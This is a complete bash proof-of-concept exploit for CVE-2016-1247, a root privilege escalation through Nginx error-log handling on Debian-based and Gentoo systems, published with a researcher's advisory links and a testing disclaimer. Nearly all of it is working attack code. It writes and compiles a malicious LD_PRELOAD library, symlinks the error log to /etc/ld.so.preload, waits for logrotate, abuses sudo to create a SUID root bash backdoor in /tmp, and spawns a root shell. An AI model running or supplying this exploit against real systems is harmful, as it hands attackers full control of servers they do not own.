#!/bin/bash
#
# Nginx (Debian-based + Gentoo distros) - Root Privilege Escalation PoC Exploit
# nginxed-root.sh (ver. 1.1)
#
# CVE-2016-1247
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# https://legalhackers.com
#
# Follow https://twitter.com/dawid_golunski for updates on this advisory.
#
# ---
# This PoC exploit allows local attackers on Debian-based and Gentoo systems 
# (Debian, Ubuntu, Gentoo etc.) to escalate their privileges from nginx web 
# server user (www-data) to root through unsafe error log handling.
#
# The exploit waits for Nginx server to be restarted or receive a USR1 signal.
# On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)
# script which is called daily by the cron.daily on default installations.
# The restart should take place at 6:25am which is when cron.daily executes.
# Attackers can therefore get a root shell automatically in 24h at most without any admin
# interaction just by letting the exploit run till 6:25am assuming that daily logrotation 
# has been configured. 
#
#
# Exploit usage:
# ./nginxed-root.sh path_to_nginx_error.log 
#
# To trigger logrotation for testing the exploit, you can run the following command:
#
# /usr/sbin/logrotate -vf /etc/logrotate.d/nginx
#
# See the full advisory for details at:
# https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#
# Video PoC:
# https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#
#
# Disclaimer:
# For testing purposes only. Do no harm.
#

BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/nginxrootsh"
PRIVESCLIB="/tmp/privesclib.so"
PRIVESCSRC="/tmp/privesclib.c"
SUIDBIN="/usr/bin/sudo"

function cleanexit {
	# Cleanup 
	echo -e "\n[+] Cleaning up..."
	rm -f $PRIVESCSRC
	rm -f $PRIVESCLIB
	rm -f $ERRORLOG
	touch $ERRORLOG
	if [ -f /etc/ld.so.preload ]; then
		echo -n > /etc/ld.so.preload
	fi
	echo -e "\n[+] Job done. Exiting with code $1 \n"
	exit $1
}

function ctrl_c() {
        echo -e "\n[+] Ctrl+C pressed"
	cleanexit 0
}

#intro 

cat <<_eascii_
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
_eascii_

echo -e "\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m"

# Args
if [ $# -lt 1 ]; then
	echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"
	echo -e "It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"
	exit 3
fi

# Priv check

echo -e "\n[+] Starting the exploit as: \n\033[94m`id`\033[0m"
id | grep -q www-data
if [ $? -ne 0 ]; then
	echo -e "\n[!] You need to execute the exploit as www-data user! Exiting.\n"
	exit 3
fi

# Set target paths
ERRORLOG="$1"
if [ ! -f $ERRORLOG ]; then
	echo -e "\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\n"
	exit 3
fi

# [ Exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
	static uid_t  (*old_geteuid)();
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if ( old_geteuid() == 0 ) {
		chown("$BACKDOORPATH", 0, 0);
		chmod("$BACKDOORPATH", 04777);
		unlink("/etc/ld.so.preload");
	}
	return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
	echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
	cleanexit 2;
fi


# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
	echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
	exit 2
fi

# Symlink the log file
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
	echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
	cleanexit 3
fi
echo -e "\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`"

# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered
curl http://localhost/ >/dev/null 2>/dev/null
# Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily 
# rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)
echo -ne "\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am..."
while :; do 
	sleep 1
	if [ -f /etc/ld.so.preload ]; then
		echo $PRIVESCLIB > /etc/ld.so.preload
		rm -f $ERRORLOG
		break;
	fi
done

# /etc/ld.so.preload should be owned by www-data user at this point
# Inject the privesc.so shared library to escalate privileges
echo $PRIVESCLIB > /etc/ld.so.preload
echo -e "\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \n`ls -l /etc/ld.so.preload`"
echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"
chmod 755 /etc/ld.so.preload

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"
sudo 2>/dev/null >/dev/null

# Check for the rootshell
ls -l $BACKDOORPATH
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then 
	echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
	echo -e "\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m"
else
	echo -e "\n[!] Failed to get root"
	cleanexit 2
fi

rm -f $ERRORLOG
echo > $ERRORLOG
 
# Use the rootshell to perform cleanup that requires root privilges
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
# Reset the logging to error.log
$BACKDOORPATH -p -c "kill -USR1 `pidof -s nginx`"

# Execute the rootshell
echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"
$BACKDOORPATH -p -i

# Job done.
cleanexit 0
